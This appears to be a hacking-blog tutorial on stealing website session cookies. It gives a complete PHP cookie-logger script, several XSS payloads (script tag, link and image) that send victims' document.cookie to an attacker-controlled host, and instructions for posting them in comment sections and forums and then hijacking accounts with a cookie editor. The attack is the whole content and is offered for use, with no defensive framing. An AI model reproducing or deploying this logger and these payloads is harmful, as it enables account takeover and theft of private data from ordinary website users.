# http://hackiteasy.blogspot.in/

<?php

function GetIP()
{
  if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
  $ip = getenv("HTTP_CLIENT_IP");
  else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
  $ip = getenv("HTTP_X_FORWARDED_FOR");
  else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
  $ip = getenv("REMOTE_ADDR");
  else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
  $ip = $_SERVER['REMOTE_ADDR'];
  else
  $ip = "unknown";
  return($ip);
}

function logData()
{
$ipLog="log.txt";
$cookie = $_SERVER['QUERY_STRING'];
$register_globals = (bool) ini_get('register_gobals');
if ($register_globals) $ip = getenv('REMOTE_ADDR');
else $ip = GetIP();

$rem_port = $_SERVER['REMOTE_PORT'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$rqst_method = $_SERVER['METHOD'];
$rem_host = $_SERVER['REMOTE_HOST'];
$referer = $_SERVER['HTTP_REFERER'];
$date=date ("l dS of F Y h:i:s A");
$log=fopen("$ipLog", "a+");

if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog))
fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE: $cookie
");
else
fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE: $date | COOKIE: $cookie \n\n");
fclose($log);
}

logData();

?>

Save the script as a cookielogger.php on your server.
(You can get any free webhosting easily such as justfree,x10hosting etc..)

Create an empty text file log.txt in the same directory on the webserver. The hijacked/hacked cookies will be automatically stored here.

Now for the hack to work we have to inject this piece of javascript into the target's page. This can be done by adding a link in the comments page which allows users to add hyperlinks etc. But beware some sites dont allow javascript so you gotta be lucky to try this.

The best way is to look for user interactive sites which contain comments or forums.

Post the following code which invokes or activates the cookielogger on your host.

Code:
<script language="Java script">
document.location="http://www.yourhost.com/cookielogger.php?cookie=&quot; + document.cookie;
</script>

Your can also trick the victim into clicking a link that activates javascript.
Below is the code which has to be posted.

Code:
<a href="java script:document.location='http://www.yourhost.com/cookielogger.php?cookie='+document.cookie;">Click here!</a>

Clicking an image also can activate the script.For this purpose you can use the below code.

Code:
<a href="java script:document.location='http://www.yourhost.com/cookielogger.php?cookie='+document.cookie;"&gt;

<img src="URL OF THE IMAGE"/></a>

All the details like cookie,ipaddress,browser of the victim are logged in to log.txt on your hostserver

In the above codes please remove the space in between javascript.

Hijacking the Session:

Now we have cookie,what to do with this..?
Download cookie editor mozilla plugin or you may find other plugins as well.

Go to the target site-->open cookie editor-->Replace the cookie with the stolen cookie of the victim and refresh the page.Thats it!!!you should now be in his account.
